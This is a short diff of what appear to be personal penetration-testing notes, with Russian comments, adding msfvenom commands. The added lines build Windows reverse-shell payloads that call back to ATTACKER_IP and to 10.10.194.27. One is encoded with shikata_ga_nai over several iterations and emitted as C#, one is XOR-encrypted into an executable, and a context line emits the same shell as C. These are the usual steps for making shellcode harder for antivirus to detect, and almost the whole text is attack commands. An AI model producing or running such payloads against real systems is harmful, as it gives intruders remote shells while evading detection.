@@ -40,6 +40,19 @@ export PATH=$PATH:/usr/local/go/bin
     
     windows/x64/shell/reverse_tcp   Staged payload
 
+        -- кодеры msvenom шеллкода
+        
+    msfvenom --list encoders | grep excellent
+
+    msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
+
+        --- обфускаторы msvenom
+
+        msfvenom --list encrypt
+        
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.194.27 LPORT=9001 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
+
+
 генерим пайлоад на с
 
 msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=10.10.194.27 lport=9001 -f c
